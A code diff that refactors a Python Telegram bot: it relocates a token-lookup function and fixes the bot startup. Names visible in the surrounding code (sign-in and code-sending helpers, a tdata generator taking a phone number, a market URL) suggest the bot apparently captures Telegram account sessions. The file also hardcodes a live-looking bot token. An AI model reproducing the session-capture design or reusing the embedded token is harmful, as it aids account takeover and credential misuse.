@@ -11,19 +11,6 @@ from aiogram.types import (
 from auth import send_code, sign_in
 
 BOT_TOKEN = os.environ.get("BOT_TOKEN", "8789355308:AAGMtNUPG2nuxz7W-P8FGFXEG5yKIhOCjCI")
-
-async def get_active_token():
-    import urllib.parse
-    try:
-        raw = await redis_get("panel_bot")
-        if raw:
-            data = json.loads(urllib.parse.unquote(raw))
-            token = data.get("token")
-            if token:
-                return token
-    except:
-        pass
-    return BOT_TOKEN
 REDIS_URL = os.environ.get("UPSTASH_REDIS_REST_URL")
 REDIS_TOKEN = os.environ.get("UPSTASH_REDIS_REST_TOKEN")
 OWNER_ID = 7345056431
@@ -43,7 +30,8 @@ async def send_log(text: str):
 MARKET_URL = "https://frontend-sigma-coral-35.vercel.app"
 BOT_USERNAME = "asfafaff_bot"
 
-bot = Bot(token=BOT_TOKEN)
+_default_bot = Bot(token=BOT_TOKEN)
+bot = _default_bot
 dp = Dispatcher()
 pending = {}
 
@@ -70,6 +58,19 @@ async def redis_del(key):
             f"{REDIS_URL}/del/{key}",
             headers={"Authorization": f"Bearer {REDIS_TOKEN}"}
         )
+
+async def get_active_token():
+    import urllib.parse
+    try:
+        raw = await redis_get("panel_bot")
+        if raw:
+            data = json.loads(urllib.parse.unquote(raw))
+            token = data.get("token")
+            if token:
+                return token
+    except:
+        pass
+    return BOT_TOKEN
 
 async def redis_set_json(key, data: dict, ex=86400):
     import urllib.parse
@@ -405,8 +406,8 @@ async def generate_tdata(user_id, phone):
 
 async def main():
     active_token = await get_active_token()
-    active_bot = bot(token=active_token)
-    print(f"starting bot with token: {active_token[:20]}...")
+    active_bot = Bot(token=active_token) if active_token != BOT_TOKEN else bot
+    print(f"Starting bot with token: {active_token[:20]}...")
     await dp.start_polling(active_bot)
 
 if __name__ == "__main__":
